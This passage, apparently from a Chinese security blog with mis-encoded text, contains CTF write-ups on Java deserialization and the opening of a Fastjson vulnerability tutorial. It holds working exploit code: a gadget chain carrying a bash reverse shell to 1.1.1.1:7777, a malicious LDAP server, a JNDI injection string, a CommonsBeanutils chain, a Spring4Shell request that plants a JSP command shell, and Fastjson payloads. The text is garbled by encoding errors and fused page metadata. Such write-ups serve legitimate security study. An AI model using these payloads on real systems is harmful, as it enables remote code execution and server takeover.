1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,&lt;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1çš„base64ç¼–ç &gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;);//è¿™é‡Œéœ€è¦æ›´æ”¹ setValue(templates, &quot;_name&quot;, &quot;111&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; å°†è¿™ä¸ªçš„è¾“å‡ºå¡«å†™åˆ°jndié«˜ç‰ˆæœ¬ç»•è¿‡çš„è„šæœ¬ä¸­ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.URL;//é«˜ç‰ˆæœ¬LDAPç»•è¿‡public class LDAPServer &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main ( String[] tmp_args ) throws Exception&#123; String[] args=new String[]&#123;&quot;http://localhost/#Evail&quot;&#125;; int port = 6666; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, //$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); ds.startListening(); &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;&lt;ä¸Šè¿°è„šæœ¬çš„è¾“å‡º&gt;&quot;)); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; ä¹‹åå°†å…¶æ‰“åŒ…æˆjarï¼Œä¸Šä¼ åˆ°vpsä¸Šè¾¹ï¼Œç›´æ¥è¿è¡Œçš„åŒæ—¶ç›‘å¬ç›¸åº”ç«¯å£ï¼Œç„¶ååœ¨è¯·æ±‚çš„urlåæ·»åŠ å¦‚ä¸‹å›¾æ‰€ç¤ºçš„payloadå³å¯ï¼š 1$&#123;jndi:ldap://1.1.1.1:6666/Evail&#125;&lt;æ­¤å¤„éœ€è¦æ›´æ”¹vpsåœ°å€&gt; ä¹‹åå¦‚å›¾æ‰€ç¤ºè·å–åˆ°shell [MTCTF 2022]easyjavaè¿™é¢˜å¬è¯´åœ¨NSSä¸Šå¼€èµ·æ¥çš„æœ‰é—®é¢˜ï¼Œé‚£å°±ç›´æ¥å»https://github.com/CTF-Archives/2022-mtgxs-web-easyjavaè¿™é‡Œï¼ŒæŠŠjaråŒ…ä¸‹ä¸‹æ¥è‡ªå·±æ­ä¸ªæœ¬åœ°ç¯å¢ƒæ‰“å§ ååºåˆ—åŒ–å…¥å£ç‚¹åœ¨è¿™é‡Œï¼Œä½†è¦æƒ³è¿›å…¥è¿™ä¸ªè·¯ç”±å¾—å…ˆç»è¿‡ä¸‹è¾¹çš„shiroè®¤è¯ï¼š å…¶ä¸­ï¼Œç™»å½•è®¤è¯éƒ¨åˆ†å¦‚ä¸‹ï¼š æˆ‘ä»¬æ²¡æœ‰ç”¨æˆ·åå¯†ç ï¼Œå°±åªèƒ½è€ƒè™‘shiroçš„æƒé™ç»•è¿‡äº†ï¼Œæœ¬é¢˜çš„shiroç‰ˆæœ¬ä¸º1.5.2ï¼Œäºæ˜¯ä½¿ç”¨CVE-2020-11989 æˆåŠŸç»•è¿‡ï¼Œä¹‹åçœ‹ä¸€ä¸‹ååºåˆ—åŒ–çš„é»‘åå•ï¼š emmï¼Œç¬¬ä¸€ä¸ªé»‘åå•æ„Ÿè§‰åƒæ˜¯å°‘äº†ä¸ª. ä¸è¿‡æ— æ‰€è°“ï¼Œå› ä¸ºæœ‰commons-beanutils-1.9.4.jarä¾èµ–ï¼Œç›´æ¥CBé“¾å­æ‰“å°±å®Œäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class cb &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123; TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;aaaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class&lt;PriorityQueue&gt; c = PriorityQueue.class; Field comparatorField = c.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue,beanComparator); //åºåˆ—åŒ– ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(priorityQueue); //ååºåˆ—åŒ–// ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;));// ois.readObject(); &#125;&#125; ä¹‹åbase64ç¼–ç åæ‰“å°±å®Œäº†ï¼Œè¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹ç¯å¢ƒçš„ä¾èµ–ç‰ˆæœ¬é…ç½®ï¼Œä¸ä¸€æ ·çš„è¯å¯èƒ½ä¼šæŠ¥é”™serialVersionUIDçš„é—®é¢˜ [NUSTCTF 2022 æ–°ç”Ÿèµ›]Ezjavaflag1 è€ƒæŸ¥javabeançš„èµ‹å€¼æ“ä½œï¼Œpayloadï¼š/addUser1?department.name1=njust&amp;name=2022 flag2 è€ƒæŸ¥CVE-2022-22965 Spring Framework ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ postä¼ å‚ï¼š 1class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25&#123;prefix&#125;ijava.io.InputStream+in+%3d+Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream()%3bint+a+%3d+-1%3bbyte[]+b+%3d+new+byte[4096]%3bout.print(&quot;&lt;/pre&gt;&quot;)%3bwhile((a%3din.read(b))!%3d-1)&#123;+out.println(new+String(b))%3b+&#125;out.print(&quot;&lt;/pre&gt;&quot;)%3b%25&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=njust2022.njust&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= å…¶ä¸­çš„å…·ä½“å«ä¹‰ï¼š 1234567class.module.classLoader.resources.context.parent.pipeline.first.pattern=rce_20220329 ï¼ˆå†™å…¥shellå†…å®¹ï¼‰ class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jspï¼ˆä¿®æ”¹tomcaté…ç½®æ—¥å¿—æ–‡ä»¶åç¼€jspï¼‰ class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOTï¼ˆå†™å…¥shellåœ¨ç½‘ç«™æ ¹ç›®å½•ï¼‰ class.module.classLoader.resources.context.parent.pipeline.first.prefix=shellï¼ˆå†™å…¥shellæ–‡ä»¶åç§°ï¼‰&lt;br&gt;&lt;br&gt;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=ï¼ˆæ–‡ä»¶æ—¥æœŸæ ¼å¼ï¼ˆå®é™…æ„é€ ä¸ºç©ºå€¼å³å¯ï¼‰ï¼‰","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Fastjsonååºåˆ—åŒ–","slug":"JAVAå®‰å…¨Fastjsonååºåˆ—åŒ–","date":"2024-03-30T02:33:57.809Z","updated":"2024-08-26T12:32:16.231Z","comments":true,"path":"2024/03/30/JAVAå®‰å…¨Fastjsonååºåˆ—åŒ–/","link":"","permalink":"http://example.com/2024/03/30/JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;31 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;31 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€å¬ç™½æ—¥æ¢¦ç»„é•¿è®²è¯¾èŒ…å¡é¡¿å¼€ï¼Œä¸‹è¾¹è®°å½•ä¸€ä¸‹å­¦åˆ°çš„çŸ¥è¯† 1.ä½¿ç”¨æ–¹å¼Fastjsonæ˜¯ä¸€ä¸ªå¼€æºçš„Javaç±»åº“ï¼Œå¯ä»¥é€šè¿‡åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ï¼Œå°†Javaå¯¹è±¡è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼Œæˆ–è€…å°†jsonå­—ç¬¦ä¸²è½¬æ¢æˆJavaå¯¹è±¡ã€‚ ä½¿ç”¨æ–¹æ³•å¤§è‡´å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334public class User &#123; private String name; private int id; public User()&#123; System.out.println(&quot;æ— å‚æ„é€ &quot;); &#125; public User(String name, int id) &#123; System.out.println(&quot;æœ‰å‚æ„é€ &quot;); this.name = name; this.id = id; &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getId() &#123; System.out.println(&quot;getId&quot;); return id; &#125; public void setId(int id) &#123; System.out.println(&quot;setId&quot;); this.id = id; &#125;&#125; é¦–å…ˆå®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶åä¼ å…¥jsonå­—ç¬¦ä¸²è¿›è¡Œè§£æï¼š 123456String s = &quot;&#123;\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject.get(&quot;name&quot;));// è¾“å‡º:// lily ç»“æœåªä¼šæ‰“å°ä¸€ä¸ªlilyï¼Œè€Œå½“æˆ‘ä»¬æŒ‡å®šè§£æçš„ç±»å‹æ—¶ï¼Œå°±ä¼šå‘é€ä»¥ä¸‹æƒ…å†µï¼š 12345678910String s = &quot;&#123;\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;User user = JSON.parseObject(s,User.class);System.out.println(user.getName());// è¾“å‡º:// æ— å‚æ„é€ // setId// setName// getName// lily å¯è§åœ¨è§£æå­—ç¬¦ä¸²çš„æ—¶å€™è°ƒç”¨äº†æ„é€ å™¨å’Œsetæ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä¼ å‚çš„æ–¹å¼ä½¿ç”¨@typeæ§åˆ¶è§£æçš„ç±»å‹ï¼š 1234567891011String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.User\\&quot;,\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject);// è¾“å‡º:// æ— å‚æ„é€ // setId// setName// getId// getName// &#123;&quot;name&quot;:&quot;lily&quot;,&quot;id&quot;:1&#125; å¯è§ä¸ä»…è°ƒç”¨äº†æ„é€ å™¨å’Œsetæ–¹æ³•ï¼Œè¿˜è°ƒç”¨äº†getæ–¹æ³•ã€‚ ï¼ˆæ³¨æ„ï¼Œæ­¤å¤„çš„setæ–¹æ³•è¦æƒ³è§¦å‘éœ€è¦æœ‰ä¸€ä¸ªä¼ å‚ï¼Œå¦åˆ™ä¸ä¼šæ‰§è¡Œï¼‰ 2.è°ƒè¯•ä¸‹é¢æˆ‘ä»¬åœ¨jsonObjectè¿™é‡Œæ‰“ä¸ªæ–­ç‚¹æ¥è°ƒè¯•çœ‹ä¸€ä¸‹å…·ä½“çš„æµç¨‹ï¼š é¦–å…ˆè¿›å…¥äº†JSONç±»çš„parseObjectæ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†parseæ–¹æ³•è¿›è¡Œè§£æï¼Œæœ€åå†å¼ºè½¬ä¸ºJSONObjectæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹ï¼š parseé‡Œè¾¹è¿˜æœ‰ä¸€ä¸ªparseï¼Œå¹¶ä¸”å¤šäº†ä¸ªæŒ‡å®šçš„è§£æfeatureå€¼ï¼Œå°†è¢«è§£æçš„å†…å®¹åˆ›å»ºæˆä¸€ä¸ªDefaultJSONParserç±»çš„å®ä¾‹ï¼Œç„¶ååˆè¿›è¡Œparseæ“ä½œï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š ç”±ç¬¬1292è¡Œå¼€å§‹ä¹‹åè°ƒç”¨ç¬¬1305è¡Œçš„parseæ–¹æ³•ï¼Œä¹‹åä¼šå¯¹æˆ‘ä»¬çš„ä¼ å‚è¿›è¡ŒåŒ¹é…ï¼Œçœ‹çœ‹ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬çš„æ˜¯å·¦å¤§æ‹¬å·ï¼Œæ‰€ä»¥ç›´æ¥è¿›ç¬¬1325è¡Œçš„case LBRACEï¼Œç„¶ååœ¨ç¬¬1327è¡Œåˆ™ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„è§£æï¼Œè§£æå‡ºæˆ‘ä»¬ä¼ å…¥çš„keyå€¼ï¼š ä¹‹åä¼šè¿›å…¥è¿™é‡Œï¼Œå¦‚æœæˆ‘ä»¬çš„keyæ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œå°±ä¼šç‰¹æ®Šå¤„ç†ï¼Œè¿™é‡Œçš„DEFAULT_TYPE_KEYå°±æ˜¯@typeï¼š ç„¶åä¼šåœ¨TypeUtils.loadClassä¸­åŠ è½½æˆ‘ä»¬æŒ‡å®šçš„ç±»ï¼Œä¹‹åè¿›å…¥ååºåˆ—åŒ–é˜¶æ®µï¼š è¿›å…¥ParserConfigç±»çš„getDeserializeræ–¹æ³•ï¼Œè¿™é‡Œæ˜¯è·å–ä¸€äº›ç±»çš„ååºåˆ—åŒ–ç›¸å…³çš„æ–¹æ³•ï¼Œä¸€èˆ¬æ¥è¯´è‡ªå·±åˆ›å»ºçš„ç±»å°±ä¼šè¿›å…¥æœ€åçš„è¿™éƒ¨åˆ†ï¼š ä¹‹ååœ¨ParserConfigç±»çš„createJavaBeanDeserializeræ–¹æ³•ä¸­è¿›å…¥JavaBeanInfoç±»çš„buildæ–¹æ³• ç„¶åè¿›è¡ŒJavaBeanInfoçš„åˆ›å»ºå·¥ä½œï¼Œè¿™é‡Œæ¶‰åŠåˆ°æŒ‡å®šç±»çš„æ„é€ å™¨ä»¥åŠget,setæ–¹æ³•çš„è·å–ï¼š ä¹‹åå°±æ˜¯ä½¿ç”¨JavaBeanDeserializeråˆ©ç”¨å‰è¾¹è·å–åˆ°çš„æ„é€ å™¨ä»¥åŠget,setæ–¹æ³•å°†jsonå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJavaç±»å¯¹è±¡ï¼Œä¸ºäº†è¿›å…¥è¿™éƒ¨åˆ†ï¼Œéœ€è¦getOnlyä¸ºtrueï¼Œéœ€è¦æˆ‘ä»¬åœ¨Userç±»é‡Œè¾¹åŠ ä¸€ä¸ªgetæ–¹æ³•æ— å¯¹åº”çš„setæ–¹æ³•ä¸”ç¬¦åˆä¸‹å›¾æ¡ä»¶ï¼š ï¼ˆè¿™ä¹‹åçš„éƒ¨åˆ†å¾ˆæ°µï¼Œä»…ä¾›è‡ªå·±è®°å¿†ï¼Œå»ºè®®å»çœ‹ç™½æ—¥æ¢¦ç»„é•¿å¤§ä½¬çš„æµç¨‹ï¼‰ 123456private Map map;public Map getMap()&#123; System.out.println(&quot;getMap&quot;); return map;&#125; ä¹‹åç”±è¿™é‡Œè¿›å…¥JavaBeanDeserializerç±»ï¼š å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¹‹åä¼šå›åˆ°ParserConfigç±»é‡Œè¾¹ï¼š ç„¶åå°±æ˜¯é€å±‚è·³å‡ºå„ä¸ªç±»ï¼Œå›åˆ°DefaultJSONParserç±»çš„parseObjectæ–¹æ³•ä¸­ï¼š æ¥ç€å°±ä¼šè°ƒç”¨è·å–åˆ°çš„ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–ï¼Œåœ¨å¦‚ä¸‹åœ°æ–¹è§¦å‘æ„é€ å™¨å’Œsetæ–¹æ³•ï¼š å†ä¹‹åå°±å‡ºæ¥äº†ï¼Œæœ€ågetæ–¹æ³•åœ¨æœ€åtoJSONçš„æ—¶å€™è°ƒç”¨ï¼š è‡³æ­¤ï¼ŒFastjsonçš„ååºåˆ—åŒ–æµç¨‹å·®ä¸å¤šæ˜¯èµ°å®Œäº† 3.åˆ©ç”¨éšä¾¿æä¸€ä¸ªå«æœ‰ä¼ å‚çš„setæ–¹æ³•æ¶æ„ç±»å³å¯ï¼š ä¹‹åæŒ‡å®šè¿™ä¸ªç±»å°±èƒ½å¼¹å‡ºè®¡ç®—å™¨ æ­£æ–‡1.Fastjson 1.2.241.1 JdbcRowSetImplé“¾ åœ¨JdbcRowSetImplç±»é‡Œè¾¹æœ‰connectæ–¹æ³•ï¼Œè™½ç„¶æ²¡æœ‰æˆªå…¨ï¼Œä½†å¾ˆå®¹æ˜“çœ‹å‡ºé‡Œè¾¹æœ‰InitialContextå’Œlookupï¼Œæ ‡å‡†çš„jndiæ³¨å…¥ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦é€šè¿‡Fastjsonçš„æ–¹å¼æ¥è§¦å‘ï¼Œå°±éœ€è¦getæˆ–è€…setæ–¹æ³•ï¼Œæœ€å¥½æ˜¯setæ–¹æ³•ï¼Œå› ä¸ºgetæ–¹æ³•å®ç°èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼š æœ‰setå°±ç”¨setï¼š è¿™æ ·ä¸€æ¥å°±èƒ½å¤Ÿè§¦å‘jndiæ³¨å…¥äº†ï¼Œä½†è¿˜å°‘äº†lookupçš„å‚æ•°æ§åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªsetDataSourceNameæ–¹æ³•ï¼š è¯¥æ–¹æ³•åœ¨BaseRowSetç±»é‡Œï¼Œä½†æ²¡å…³ç³»ï¼Œå› ä¸ºJdbcRowSetImplç±»ç»§æ‰¿äº†BaseRowSetç±»ã€‚ä¸‹é¢æˆ‘ä»¬ç›´æ¥å†™é“¾å­å°±å¥½äº†ï¼š é¦–å…ˆæŒ‡å®šJdbcRowSetImplç±»ï¼Œä¹‹åç»™DataSourceNameå’ŒAutoCommitèµ‹å€¼ï¼š 123String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:7777/TestRef\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject); è¿è¡Œä¹‹å‰æ³¨æ„ç”¨7777ç«¯å£å¼€ä¸€ä¸ªldapæœåŠ¡å°±å¥½äº†ï¼ˆä»£ç æ”¾åœ¨æ–‡ç« æœ€åï¼‰ï¼š ï¼ˆæ­¤å¤„æœ‰ä¸ªå‘ç‚¹ï¼Œå°±æ˜¯éœ€è¦ç¡®ä¿jdk1.8çš„ç‰ˆæœ¬è¶³å¤Ÿä½ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™java.lang.ClassCastException: javax.naming.Reference cannot becast to javax.sql.DataSourceï¼‰ 1.2 Bcel_ClassLoaderé“¾ åœ¨com.sun.org.apache.bcel.internal.utilçš„ä¸‹é¢æœ‰ä¸ªClassLoaderç±»ï¼Œå…¶loadClassæ–¹æ³•å­˜åœ¨åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¤§è‡´éœ€è¦æˆ‘ä»¬ä¼ å‚ä»¥$$BCEL$$ä¸ºå¼€å¤´ï¼ŒcreatClasså¦‚ä¸‹æ‰€ç¤ºï¼š éœ€è¦æˆ‘ä»¬å°†è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨$$BCEL$$åè¾¹ï¼Œå¹¶Utility.encodeä¸€ä¸‹ï¼Œä¹‹åæˆ‘ä»¬å†æ‰¾èƒ½å¤Ÿæ‰¿æ¥ClassLoaderçš„ç±»ï¼š åœ¨org.apache.tomcat.dbcp.dbcp2åŒ…ä¸‹çš„BasicDataSourceç±»é‡Œè¾¹å­˜åœ¨createConnectionFactoryæ–¹æ³•ï¼Œé‡Œè¾¹æœ‰ç€Class.forNameï¼Œå¯ä»¥é€šè¿‡åŠ¨æ€ç±»åŠ è½½è§¦å‘loadClassçš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±éœ€è¦çœ‹ä¸€çœ‹èƒ½å¦æ§åˆ¶driverClassNameå’ŒdriverClassLoaderäº†ï¼Œå®é™…ä¸Šåœ¨è¿™ä¸ªç±»é‡Œè¾¹ç¡®å®æœ‰setæ–¹æ³•ï¼š ä½†è¿˜æ²¡å®Œï¼Œæˆ‘ä»¬éœ€è¦ä»createConnectionFactoryæ–¹æ³•å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ°ä¸€ä¸ªgetæˆ–è€…setæ–¹æ³•ä»¥ä¾¿äºèƒ½å¤Ÿåˆ©ç”¨Fastjsonè§¦å‘é“¾å­ï¼š å‘ç°å¯ä»¥å¾€ä¸Šè¾¹çš„createDataSourceæ–¹æ³•å†å¾€ä¸ŠgetConnectionæ–¹æ³•è§¦å‘ï¼š æµç¨‹æ‰¾å®Œäº†ï¼Œæˆ‘ä»¬æ¥å†™é“¾å­ï¼š å…¶å®å°±æ˜¯å…ˆç»™driverClassLoader setæˆæˆ‘ä»¬çš„ClassLoaderï¼Œç„¶åç»™driverClassName setä¸ºæˆ‘ä»¬çš„ä»¥$$BCEL$$ä¸ºå¼€å¤´çš„ä¸”encodeåçš„æ¶æ„ä»£ç ï¼Œæœ€ååˆ©ç”¨jsonObjectçš„toJSONè§¦å‘getConnectionå°±å¥½äº†ï¼š 123456789101112131415161718192021package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.sun.org.apache.bcel.internal.classfile.Utility;import java.io.IOException;import java.nio.file.Path;import java.nio.file.Paths;import java.nio.file.Files;public class Test2 &#123; public static void main(String[] args) throws IOException &#123; Path path = Paths.get(&quot;G:\\\\web\\\\ctf_java\\\\Fastjson_1.2.24\\\\target\\\\classes\\\\org\\\\example\\\\calc.class&quot;); byte[] bytes = Files.readAllBytes(path); String code = Utility.encode(bytes,true); String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\&quot;,\\&quot;driverClassName\\&quot;:\\&quot;$$BCEL$$&quot;+code+&quot;\\&quot;,\\&quot;driverClassLoader\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\\&quot;&#125;&#125;&quot;; JSONObject jsonObject = JSON.parseObject(s); System.out.println(jsonObject); &#125;&#125; 1.3 TemplatesImplé“¾è¯´æ˜¯é“¾å­ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸ªæŒ‡å®šçš„åŠ¨æ€ç±»åŠ è½½ï¼Œå¯ä»¥ç›´æ¥ç”¨æ¥åŠ è½½æ¶æ„ç±» 12345678910//æ¶æ„ç±»TempletaPocè½¬æ¢æˆå­—èŠ‚ç ï¼Œbase64ç¼–ç String byteCode = &quot;xxxxxxxxxxxxxxxxxx&quot;;//æ„é€ TemplatesImplçš„jsonæ•°æ®ï¼Œå¹¶å°†æ¶æ„ç±»æ³¨å…¥åˆ°jsonæ•°æ®ä¸­final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;;System.out.println(payload); æ‰“å°±å®Œäº† 2.Fastjson&lt;&#x3D;1.2.47è¿™é‡Œç›´æ¥ç”¨çš„1.2.25çš„ç‰ˆæœ¬ 